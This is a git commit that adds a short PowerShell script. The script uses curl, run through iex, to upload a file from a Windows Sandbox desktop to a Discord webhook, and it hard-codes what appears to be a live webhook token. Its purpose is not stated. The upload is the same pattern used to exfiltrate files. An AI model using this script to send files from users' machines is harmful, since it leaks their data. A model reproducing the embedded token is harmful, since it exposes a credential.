b41ddf20ea018bd516c62c459dde963c9a0a6980
ImSouhay <71823476+ImSouhay@users.noreply.github.com>
2024-11-27 01:39:29 +0100

    Create t.ps1

---
+++ Objects/t.ps1
@@ -0,0 +1,16 @@
+# PowerShell script to upload a file using cURL
+
+# Path to the file you want to upload
+$filePath = "C:/Users/WDAGUtilityAccount/Desktop/t.txt"
+
+# Webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1311053691310178366/YbI5wprIFytQEbqru6RDLN6fta08vELFToRY35qcd177flpaqA2FjHpMFDeJt2elbJkN"
+
+# Ensure the file exists before proceeding
+if (Test-Path $filePath) {
+    # Execute the curl command to upload the file
+    $curlCommand = "curl -F `""file=@$filePath`"" `"$webhookUrl`""
+    iex $curlCommand
+} else {
+    Write-Host "File not found at path: $filePath"
+}
